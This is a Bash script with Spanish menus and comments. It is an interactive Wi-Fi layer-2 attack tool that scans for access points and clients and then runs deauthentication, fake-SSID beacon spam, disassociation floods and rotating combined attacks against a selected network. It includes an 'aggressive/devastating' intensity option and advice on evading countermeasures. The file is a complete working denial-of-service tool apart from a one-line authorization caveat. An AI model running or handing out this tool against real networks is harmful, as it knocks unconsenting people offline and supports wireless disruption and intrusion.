#!/bin/bash

# 💢 ATAQUES CAPA 2 ULTIMATE
# Deauthentication, Beacon spam, Disassociation flood

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
CLIENT_MAC=""
ATTACK_TYPE=""
OUTPUT_DIR=""
ATTACK_DURATION=""
PACKET_COUNT=""

print_banner() {
    clear
    echo -e "${RED}"
    echo " █████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗███████╗███████╗     ██████╗ █████╗ ██████╗  █████╗     ██████╗ "
    echo "██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗██╔══██╗    ╚════██╗"
    echo "███████║   ██║   ███████║██║   ██║██║   ██║█████╗  ███████╗    ██║     ███████║██████╔╝███████║     █████╔╝"
    echo "██╔══██║   ██║   ██╔══██║██║▄▄ ██║██║   ██║██╔══╝  ╚════██║    ██║     ██╔══██║██╔═══╝ ██╔══██║    ██╔═══╝ "
    echo "██║  ██║   ██║   ██║  ██║╚██████╔╝╚██████╔╝███████╗███████║    ╚██████╗██║  ██║██║     ██║  ██║    ███████╗"
    echo "╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚══▀▀═╝  ╚═════╝ ╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}💢 Ataques Capa 2 Ultimate - Deauth, Beacon Spam y DoS${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

check_interface() {
    echo -e "${YELLOW}🔍 Verificando interface WiFi...${NC}"
    
    # Detectar interfaces WiFi
    local wifi_interfaces=($(iwconfig 2>/dev/null | grep -E "^[a-z].*IEEE 802.11" | cut -d' ' -f1))
    
    if [[ ${#wifi_interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No se detectaron interfaces WiFi${NC}"
        return 1
    fi
    
    echo -e "${CYAN}📡 Interfaces WiFi disponibles:${NC}"
    for i in "${!wifi_interfaces[@]}"; do
        local iface="${wifi_interfaces[$i]}"
        local mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Modo: $mode)"
    done
    
    read -p "🎯 Selecciona interface (1-${#wifi_interfaces[@]}): " iface_choice
    
    if [[ "$iface_choice" -ge 1 && "$iface_choice" -le ${#wifi_interfaces[@]} ]]; then
        INTERFACE="${wifi_interfaces[$((iface_choice-1))]}"
    else
        INTERFACE="${wifi_interfaces[0]}"
    fi
    
    # Verificar/activar modo monitor
    local current_mode=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
    
    if [[ "$current_mode" != "Monitor" ]]; then
        echo -e "${YELLOW}⚠️ Interface no está en modo monitor${NC}"
        read -p "¿Activar modo monitor? (Y/n): " activate_monitor
        
        if [[ $activate_monitor != [nN] ]]; then
            echo -e "${CYAN}🔧 Activando modo monitor...${NC}"
            sudo airmon-ng stop "$INTERFACE" 2>/dev/null
            sudo airmon-ng start "$INTERFACE" 2>/dev/null
            
            # Buscar nueva interface monitor
            local monitor_iface=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | cut -d' ' -f1)
            if [[ -n "$monitor_iface" ]]; then
                INTERFACE="$monitor_iface"
                echo -e "${GREEN}✅ Modo monitor activado: $INTERFACE${NC}"
            else
                echo -e "${RED}❌ No se pudo activar modo monitor${NC}"
                return 1
            fi
        fi
    else
        echo -e "${GREEN}✅ Interface en modo monitor: $INTERFACE${NC}"
    fi
}

scan_targets() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}ESCANEO DE OBJETIVOS${NC}            ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    local scan_file="/tmp/layer2_scan_$(date +%H%M%S)"
    
    echo -e "${CYAN}📡 Escaneando redes disponibles...${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 20 segundos${NC}"
    
    # Escanear con airodump-ng
    timeout 20 sudo airodump-ng "$INTERFACE" --write "$scan_file" --output-format csv 2>/dev/null || true
    
    if [[ ! -f "$scan_file-01.csv" ]]; then
        echo -e "${RED}❌ No se generó archivo de scan${NC}"
        return 1
    fi
    
    # Procesar resultados
    echo -e "\n${GREEN}📡 Redes encontradas:${NC}"
    echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  ENC  CLIENTS${NC}"
    echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───  ───────${NC}"
    
    local counter=1
    declare -A networks_map
    
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key_type; do
        # Filtrar líneas válidas
        if [[ -n "$bssid" && "$bssid" != "BSSID" && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            # Contar clientes conectados (buscar en sección de estaciones)
            local clients=$(grep "$bssid" "$scan_file-01.csv" | wc -l)
            
            printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %3s  %7s\n" "$counter" "$bssid" "$essid" "$channel" "$power" "$privacy" "$clients"
            networks_map["$counter"]="$bssid|$essid|$channel"
            ((counter++))
        fi
    done < "$scan_file-01.csv"
    
    if [[ $counter -eq 1 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron redes${NC}"
        return 1
    fi
    
    echo ""
    read -p "🎯 Selecciona red objetivo (1-$((counter-1))): " network_choice
    
    if [[ -n "${networks_map[$network_choice]}" ]]; then
        local network_info="${networks_map[$network_choice]}"
        TARGET_BSSID=$(echo "$network_info" | cut -d'|' -f1)
        TARGET_ESSID=$(echo "$network_info" | cut -d'|' -f2)
        local target_channel=$(echo "$network_info" | cut -d'|' -f3)
        
        echo -e "${GREEN}✅ Objetivo seleccionado:${NC}"
        echo -e "  📡 BSSID: ${CYAN}$TARGET_BSSID${NC}"
        echo -e "  📝 ESSID: ${CYAN}$TARGET_ESSID${NC}"
        echo -e "  📻 Canal: ${CYAN}$target_channel${NC}"
        
        # Fijar canal
        sudo iwconfig "$INTERFACE" channel "$target_channel" 2>/dev/null
        
        # Escanear clientes de esta red
        scan_clients
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        return 1
    fi
    
    rm -f "$scan_file"*
}

scan_clients() {
    echo -e "\n${CYAN}👥 Escaneando clientes conectados a $TARGET_ESSID...${NC}"
    
    local client_scan="/tmp/client_scan_$(date +%H%M%S)"
    
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 15 segundos${NC}"
    
    timeout 15 sudo airodump-ng "$INTERFACE" --bssid "$TARGET_BSSID" --write "$client_scan" --output-format csv 2>/dev/null || true
    
    if [[ -f "$client_scan-01.csv" ]]; then
        # Buscar sección de clientes
        local clients_section=$(grep -n "Station MAC" "$client_scan-01.csv" 2>/dev/null | head -1 | cut -d':' -f1)
        
        if [[ -n "$clients_section" ]]; then
            echo -e "\n${GREEN}👤 Clientes detectados:${NC}"
            echo -e "${BLUE}ID  MAC Address        Power  Packets${NC}"
            echo -e "${BLUE}──  ─────────────────  ─────  ───────${NC}"
            
            local counter=1
            declare -A clients_map
            
            tail -n +$((clients_section + 1)) "$client_scan-01.csv" | while IFS=',' read -r station_mac first_seen last_seen power packets bssid probes; do
                if [[ -n "$station_mac" && "$station_mac" != " Station MAC" && "$station_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                    printf "${CYAN}%2d${NC}  %-17s  %5s  %7s\n" "$counter" "$station_mac" "$power" "$packets"
                    clients_map["$counter"]="$station_mac"
                    ((counter++))
                fi
            done
            
            if [[ $counter -gt 1 ]]; then
                read -p "🎯 Selecciona cliente objetivo (0=todos, 1-$((counter-1))): " client_choice
                
                if [[ "$client_choice" == "0" ]]; then
                    CLIENT_MAC=""
                    echo -e "${YELLOW}⚡ Atacando todos los clientes${NC}"
                elif [[ -n "${clients_map[$client_choice]}" ]]; then
                    CLIENT_MAC="${clients_map[$client_choice]}"
                    echo -e "${GREEN}✅ Cliente objetivo: $CLIENT_MAC${NC}"
                fi
            else
                echo -e "${YELLOW}⚠️ No se detectaron clientes${NC}"
                CLIENT_MAC=""
            fi
        else
            echo -e "${YELLOW}⚠️ No se detectaron clientes conectados${NC}"
            CLIENT_MAC=""
        fi
    fi
    
    rm -f "$client_scan"*
}

select_attack_type() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}TIPO DE ATAQUE CAPA 2${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué ataque de capa 2 quieres ejecutar?${NC}"
    echo -e "  ${CYAN}1.${NC} 💢 Deauthentication ${PURPLE}[aireplay-ng]${NC}"
    echo -e "  ${CYAN}2.${NC} 📡 Beacon spam (SSIDs falsos) ${PURPLE}[mdk4]${NC}"
    echo -e "  ${CYAN}3.${NC} 💥 Disassociation flood ${PURPLE}[mdk4]${NC}"
    echo -e "  ${CYAN}4.${NC} 🌊 Ataque combinado (todos)"
    echo -e "  ${CYAN}5.${NC} ⚙️ Personalizado avanzado"
    echo ""
    
    read -p "Selecciona ataque (1-5): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="deauth"
            echo -e "${GREEN}✅ Ataque de deautenticación${NC}"
            configure_deauth_attack
            ;;
        2)
            ATTACK_TYPE="beacon_spam"
            echo -e "${GREEN}✅ Beacon spam${NC}"
            configure_beacon_spam
            ;;
        3)
            ATTACK_TYPE="disassoc_flood"
            echo -e "${GREEN}✅ Disassociation flood${NC}"
            configure_disassoc_attack
            ;;
        4)
            ATTACK_TYPE="combined"
            echo -e "${GREEN}✅ Ataque combinado${NC}"
            ;;
        5)
            select_custom_attack
            ;;
        *)
            echo -e "${YELLOW}Usando deautenticación por defecto${NC}"
            ATTACK_TYPE="deauth"
            configure_deauth_attack
            ;;
    esac
}

configure_deauth_attack() {
    echo -e "\n${CYAN}💢 Configuración del ataque de deautenticación:${NC}"
    
    read -p "🔢 Número de paquetes (0=continuo): " PACKET_COUNT
    PACKET_COUNT=${PACKET_COUNT:-0}
    
    if [[ "$PACKET_COUNT" == "0" ]]; then
        read -p "⏱️ Duración en segundos (0=hasta parar manualmente): " ATTACK_DURATION
        ATTACK_DURATION=${ATTACK_DURATION:-0}
    fi
    
    echo -e "${GREEN}✅ Configuración:${NC}"
    echo -e "  📦 Paquetes: ${CYAN}${PACKET_COUNT}${NC} (0=continuo)"
    if [[ "$PACKET_COUNT" == "0" ]]; then
        echo -e "  ⏱️ Duración: ${CYAN}${ATTACK_DURATION}s${NC} (0=manual)"
    fi
    [[ -n "$CLIENT_MAC" ]] && echo -e "  🎯 Cliente: ${CYAN}$CLIENT_MAC${NC}" || echo -e "  🎯 Objetivo: ${CYAN}Broadcast${NC}"
}

configure_beacon_spam() {
    echo -e "\n${CYAN}📡 Configuración del beacon spam:${NC}"
    
    read -p "🔢 Número de SSIDs falsos a generar (default 100): " fake_ssids
    fake_ssids=${fake_ssids:-100}
    
    read -p "⏱️ Duración del ataque en segundos (default 60): " ATTACK_DURATION
    ATTACK_DURATION=${ATTACK_DURATION:-60}
    
    echo -e "${GREEN}✅ Configuración beacon spam:${NC}"
    echo -e "  📡 SSIDs falsos: ${CYAN}$fake_ssids${NC}"
    echo -e "  ⏱️ Duración: ${CYAN}${ATTACK_DURATION}s${NC}"
    
    # Guardar configuración
    echo "FAKE_SSIDS=$fake_ssids" > "/tmp/beacon_config"
}

configure_disassoc_attack() {
    echo -e "\n${CYAN}💥 Configuración del disassociation flood:${NC}"
    
    read -p "⏱️ Duración del ataque en segundos (default 30): " ATTACK_DURATION
    ATTACK_DURATION=${ATTACK_DURATION:-30}
    
    read -p "🔢 Paquetes por segundo (default 100): " packets_per_sec
    packets_per_sec=${packets_per_sec:-100}
    
    echo -e "${GREEN}✅ Configuración disassociation:${NC}"
    echo -e "  ⏱️ Duración: ${CYAN}${ATTACK_DURATION}s${NC}"
    echo -e "  📦 Paquetes/seg: ${CYAN}$packets_per_sec${NC}"
    
    # Guardar configuración
    echo "PACKETS_PER_SEC=$packets_per_sec" > "/tmp/disassoc_config"
}

select_custom_attack() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}       ${YELLOW}ATAQUE PERSONALIZADO${NC}            ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}Configuración avanzada de ataques:${NC}"
    
    # Seleccionar múltiples tipos
    echo -e "\n${CYAN}🎯 Tipos de ataque a combinar:${NC}"
    read -p "¿Incluir deauthentication? (Y/n): " include_deauth
    read -p "¿Incluir beacon spam? (y/N): " include_beacon
    read -p "¿Incluir disassociation? (y/N): " include_disassoc
    
    # Configuración temporal
    echo -e "\n${CYAN}⏱️ Configuración temporal:${NC}"
    read -p "🔄 Rotar ataques cada X segundos (default 30): " rotation_time
    rotation_time=${rotation_time:-30}
    
    read -p "⏱️ Duración total en minutos (default 5): " total_duration
    total_duration=${total_duration:-5}
    
    # Configuración de intensidad
    echo -e "\n${CYAN}🔥 Intensidad del ataque:${NC}"
    echo -e "  1. Bajo (stealth)"
    echo -e "  2. Medio (normal)"
    echo -e "  3. Alto (agresivo)"
    echo -e "  4. Máximo (devastador)"
    read -p "Intensidad (1-4): " intensity
    
    ATTACK_TYPE="custom"
    
    # Crear configuración personalizada
    cat > "/tmp/custom_attack_config" << EOF
INCLUDE_DEAUTH=$include_deauth
INCLUDE_BEACON=$include_beacon
INCLUDE_DISASSOC=$include_disassoc
ROTATION_TIME=$rotation_time
TOTAL_DURATION=$((total_duration * 60))
INTENSITY=$intensity
EOF
    
    echo -e "${GREEN}✅ Configuración personalizada guardada${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="layer2_attack_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{captures,logs,results}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# Layer 2 Attack Info - $(date)
Interface: $INTERFACE
Target BSSID: $TARGET_BSSID
Target ESSID: $TARGET_ESSID
Client MAC: $CLIENT_MAC
Attack Type: $ATTACK_TYPE
Packet Count: $PACKET_COUNT
Duration: $ATTACK_DURATION
Started: $(date)
EOF
}

execute_deauth_attack() {
    echo -e "\n${YELLOW}💢 Ejecutando ataque de deautenticación...${NC}"
    
    local log_file="$OUTPUT_DIR/logs/deauth_attack.log"
    
    # Construir comando aireplay-ng
    local aireplay_cmd="aireplay-ng --deauth"
    
    # Agregar número de paquetes
    if [[ "$PACKET_COUNT" != "0" ]]; then
        aireplay_cmd="$aireplay_cmd $PACKET_COUNT"
    else
        aireplay_cmd="$aireplay_cmd 0"  # Continuo
    fi
    
    # Agregar objetivo
    aireplay_cmd="$aireplay_cmd -a $TARGET_BSSID"
    
    # Agregar cliente específico si está configurado
    if [[ -n "$CLIENT_MAC" ]]; then
        aireplay_cmd="$aireplay_cmd -c $CLIENT_MAC"
        echo -e "${CYAN}🎯 Atacando cliente específico: $CLIENT_MAC${NC}"
    else
        echo -e "${CYAN}🎯 Atacando todos los clientes (broadcast)${NC}"
    fi
    
    aireplay_cmd="$aireplay_cmd $INTERFACE"
    
    echo -e "${BLUE}Comando: $aireplay_cmd${NC}"
    
    if [[ "$ATTACK_DURATION" != "0" && "$PACKET_COUNT" == "0" ]]; then
        echo -e "${YELLOW}⏳ Atacando por $ATTACK_DURATION segundos...${NC}"
        timeout "$ATTACK_DURATION" sudo $aireplay_cmd 2>&1 | tee "$log_file" || true
    else
        echo -e "${YELLOW}⏳ Ejecutando ataque (Ctrl+C para detener)...${NC}"
        sudo $aireplay_cmd 2>&1 | tee "$log_file" || true
    fi
    
    # Procesar resultados
    process_deauth_results "$log_file"
}

execute_beacon_spam() {
    echo -e "\n${YELLOW}📡 Ejecutando beacon spam...${NC}"
    
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${RED}❌ mdk4 no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install mdk4${NC}"
        return 1
    fi
    
    local log_file="$OUTPUT_DIR/logs/beacon_spam.log"
    
    # Cargar configuración
    if [[ -f "/tmp/beacon_config" ]]; then
        source "/tmp/beacon_config"
    else
        FAKE_SSIDS=100
    fi
    
    echo -e "${CYAN}📡 Generando $FAKE_SSIDS SSIDs falsos...${NC}"
    
    # Crear lista de SSIDs falsos
    local ssid_file="$OUTPUT_DIR/fake_ssids.txt"
    
    # Generar SSIDs creativos
    {
        echo "FBI Surveillance Van"
        echo "NSA Listening Post"
        echo "CIA Mobile Unit"
        echo "Police Surveillance"
        echo "DEA Stingray"
        echo "Free WiFi (VIRUS)"
        echo "HACK_ME_IF_YOU_CAN"
        echo "This_WiFi_Has_Viruses"
        echo "Connect_For_Identity_Theft"
        echo "Absolutely_Not_A_Honeypot"
        
        # Generar SSIDs aleatorios adicionales
        for i in $(seq 11 "$FAKE_SSIDS"); do
            echo "FakeNetwork_$i"
        done
    } > "$ssid_file"
    
    echo -e "${RED}🚨 Iniciando beacon spam...${NC}"
    echo -e "${YELLOW}⏳ Duración: $ATTACK_DURATION segundos${NC}"
    
    # Ejecutar mdk4 beacon flood
    timeout "$ATTACK_DURATION" sudo mdk4 "$INTERFACE" b -f "$ssid_file" -a 2>&1 | tee "$log_file" || true
    
    echo -e "${GREEN}✅ Beacon spam completado${NC}"
}

execute_disassoc_flood() {
    echo -e "\n${YELLOW}💥 Ejecutando disassociation flood...${NC}"
    
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${RED}❌ mdk4 no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install mdk4${NC}"
        return 1
    fi
    
    local log_file="$OUTPUT_DIR/logs/disassoc_flood.log"
    
    # Cargar configuración
    if [[ -f "/tmp/disassoc_config" ]]; then
        source "/tmp/disassoc_config"
    else
        PACKETS_PER_SEC=100
    fi
    
    echo -e "${RED}💥 Iniciando disassociation flood...${NC}"
    echo -e "${CYAN}🎯 Objetivo: $TARGET_BSSID${NC}"
    echo -e "${YELLOW}⏳ Duración: $ATTACK_DURATION segundos${NC}"
    echo -e "${YELLOW}📦 Velocidad: $PACKETS_PER_SEC paquetes/seg${NC}"
    
    # Ejecutar mdk4 disassociation flood
    timeout "$ATTACK_DURATION" sudo mdk4 "$INTERFACE" d -t "$TARGET_BSSID" -s "$PACKETS_PER_SEC" 2>&1 | tee "$log_file" || true
    
    echo -e "${GREEN}✅ Disassociation flood completado${NC}"
}

execute_combined_attack() {
    echo -e "\n${YELLOW}🌊 Ejecutando ataque combinado...${NC}"
    
    echo -e "${BLUE}Fase 1: Beacon spam (30s)...${NC}"
    ATTACK_DURATION=30
    configure_beacon_spam
    execute_beacon_spam
    sleep 5
    
    echo -e "\n${BLUE}Fase 2: Disassociation flood (20s)...${NC}"
    ATTACK_DURATION=20
    configure_disassoc_attack
    execute_disassoc_flood
    sleep 5
    
    echo -e "\n${BLUE}Fase 3: Deautenticación masiva (30s)...${NC}"
    ATTACK_DURATION=30
    PACKET_COUNT=0
    CLIENT_MAC=""  # Atacar todos
    execute_deauth_attack
    
    echo -e "\n${GREEN}✅ Ataque combinado completado${NC}"
}

execute_custom_attack() {
    echo -e "\n${YELLOW}⚙️ Ejecutando ataque personalizado...${NC}"
    
    # Cargar configuración
    source "/tmp/custom_attack_config"
    
    local end_time=$(($(date +%s) + TOTAL_DURATION))
    local current_attack=1
    
    echo -e "${CYAN}🎯 Duración total: $((TOTAL_DURATION / 60)) minutos${NC}"
    echo -e "${CYAN}🔄 Rotación cada: $ROTATION_TIME segundos${NC}"
    
    while [[ $(date +%s) -lt $end_time ]]; do
        local remaining=$((end_time - $(date +%s)))
        echo -e "\n${BLUE}⏱️ Tiempo restante: $((remaining / 60))m $((remaining % 60))s${NC}"
        
        # Rotar entre ataques
        case $current_attack in
            1)
                if [[ "$INCLUDE_DEAUTH" != [nN]* ]]; then
                    echo -e "${YELLOW}🔄 Ejecutando deautenticación...${NC}"
                    ATTACK_DURATION=$ROTATION_TIME
                    PACKET_COUNT=0
                    execute_deauth_attack
                fi
                current_attack=2
                ;;
            2)
                if [[ "$INCLUDE_BEACON" == [yY]* ]]; then
                    echo -e "${YELLOW}🔄 Ejecutando beacon spam...${NC}"
                    ATTACK_DURATION=$ROTATION_TIME
                    configure_beacon_spam
                    execute_beacon_spam
                fi
                current_attack=3
                ;;
            3)
                if [[ "$INCLUDE_DISASSOC" == [yY]* ]]; then
                    echo -e "${YELLOW}🔄 Ejecutando disassociation flood...${NC}"
                    ATTACK_DURATION=$ROTATION_TIME
                    configure_disassoc_attack
                    execute_disassoc_flood
                fi
                current_attack=1
                ;;
        esac
        
        sleep 2
    done
    
    echo -e "\n${GREEN}✅ Ataque personalizado completado${NC}"
}

process_deauth_results() {
    local log_file="$1"
    
    echo -e "\n${CYAN}📊 Procesando resultados del ataque...${NC}"
    
    # Analizar log para estadísticas
    local packets_sent=$(grep -c "Sending DeAuth" "$log_file" 2>/dev/null || echo "0")
    local acks_received=$(grep -c "ACK" "$log_file" 2>/dev/null || echo "0")
    
    echo -e "${GREEN}📈 Estadísticas del ataque:${NC}"
    echo -e "  📦 Paquetes enviados: ${CYAN}$packets_sent${NC}"
    echo -e "  ✅ ACKs recibidos: ${CYAN}$acks_received${NC}"
    
    if [[ $packets_sent -gt 0 ]]; then
        local success_rate=$((acks_received * 100 / packets_sent))
        echo -e "  📊 Tasa de éxito: ${CYAN}$success_rate%${NC}"
    fi
    
    # Crear resumen
    {
        echo "=== DEAUTH ATTACK RESULTS - $(date) ==="
        echo "Target: $TARGET_ESSID ($TARGET_BSSID)"
        echo "Client: ${CLIENT_MAC:-Broadcast}"
        echo "Packets sent: $packets_sent"
        echo "ACKs received: $acks_received"
        echo "Duration: ${ATTACK_DURATION}s"
    } > "$OUTPUT_DIR/results/deauth_summary.txt"
}

monitor_network_disruption() {
    echo -e "\n${CYAN}📊 Monitoreando disrupción de la red...${NC}"
    
    local monitor_file="$OUTPUT_DIR/logs/network_monitor.log"
    
    echo -e "${YELLOW}⏳ Monitoreando por 30 segundos post-ataque...${NC}"
    
    # Monitorear la red objetivo para ver efectos
    timeout 30 sudo airodump-ng "$INTERFACE" --bssid "$TARGET_BSSID" 2>&1 | tee "$monitor_file" || true
    
    # Analizar impacto
    local clients_disconnected=$(grep -c "not associated" "$monitor_file" 2>/dev/null || echo "0")
    echo -e "${GREEN}📉 Clientes desconectados detectados: ${CYAN}$clients_disconnected${NC}"
}

show_attack_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                        ${YELLOW}RESUMEN DEL ATAQUE${NC}                             ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_BSSID" ]]; then
        echo -e "\n${GREEN}🎯 Objetivo atacado:${NC}"
        echo -e "  📡 BSSID: $TARGET_BSSID"
        echo -e "  📝 ESSID: $TARGET_ESSID"
        echo -e "  🎯 Cliente: ${CLIENT_MAC:-Broadcast}"
        echo -e "  🔧 Método: $ATTACK_TYPE"
    fi
    
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
    
    # Mostrar resúmenes si existen
    if [[ -f "$OUTPUT_DIR/results/deauth_summary.txt" ]]; then
        echo -e "\n${GREEN}📈 Resumen de deautenticación:${NC}"
        tail -5 "$OUTPUT_DIR/results/deauth_summary.txt"
    fi
    
    echo -e "\n${YELLOW}💡 Recomendaciones post-ataque:${NC}"
    echo -e "  • Verificar efectividad con airodump-ng"
    echo -e "  • Monitorear reconexiones de clientes"
    echo -e "  • Revisar logs para detectar contramedidas"
    echo -e "  • Considerar cambiar canal para evasión"
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Configurar Interface WiFi                                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔍 Escanear Redes Objetivo                                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  💢 Ataque Deauthentication                                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  📡 Beacon Spam (SSIDs Falsos)                                  ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  💥 Disassociation Flood                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  🌊 Ataque Combinado                                            ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  📊 Monitorear Disrupción de Red                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📈 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE" ]]; then
            echo -e "\n${GREEN}📡 Interface: $INTERFACE${NC}"
        fi
        
        if [[ -n "$TARGET_BSSID" ]]; then
            echo -e "${GREEN}🎯 Objetivo: $TARGET_ESSID ($TARGET_BSSID)${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) check_interface ;;
            2) 
                [[ -z "$INTERFACE" ]] && check_interface
                scan_targets
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_targets
                ATTACK_TYPE="deauth"
                configure_deauth_attack
                setup_output_directory
                execute_deauth_attack
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE" ]] && check_interface
                ATTACK_TYPE="beacon_spam"
                configure_beacon_spam
                setup_output_directory
                execute_beacon_spam
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_targets
                ATTACK_TYPE="disassoc_flood"
                configure_disassoc_attack
                setup_output_directory
                execute_disassoc_flood
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_targets
                ATTACK_TYPE="combined"
                setup_output_directory
                execute_combined_attack
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_targets
                monitor_network_disruption
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_attack_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
missing_tools=()
for tool in aircrack-ng iwconfig; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install aircrack-ng wireless-tools mdk4${NC}"
    exit 1
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para ataques de capa 2${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Ejecutar menú principal
main_menu